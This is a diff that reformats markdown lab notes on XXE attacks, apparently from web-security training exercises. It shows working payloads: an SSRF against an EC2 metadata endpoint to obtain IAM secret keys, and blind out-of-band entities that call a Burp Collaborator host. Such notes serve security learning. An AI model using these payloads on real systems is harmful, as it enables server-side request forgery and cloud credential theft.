@@ -31,7 +31,8 @@ XXE (XML External Entity) vulnerability is a security flaw that occurs when an a
     </stockCheck>
 ```    
 ## **case2: Exploiting XXE to perform SSRF attacks**
-```secnerio: The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+```
+  secnerio: The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
   motive: obtains the server's IAM secret access key from the EC2 metadata endpoint.
 
 payloads
@@ -72,7 +73,8 @@ payloads
             }"
 ```
 ## **case 3: Blind XXE with out-of-band interaction**
-``` secnerio: use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+```
+    secnerio: use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
     payloads:
     <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://pe7r5ma8pmiqhg5yu8d1hkk9b0hr5vtk.oastify.com/"> ]>
@@ -82,9 +84,10 @@ payloads
         </stockCheck>
 ```
 ## **case4: Blind XXE with out-of-band interaction via XML parameter entities**
-``` secnerio: use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator
+```
+    secnerio: use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator
 
-   Payload:
+    Payload:
             <?xml version="1.0" encoding="UTF-8"?>
                     <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burp-collabrator-subdomain/"> %xxe; ]>
                     <stockCheck>
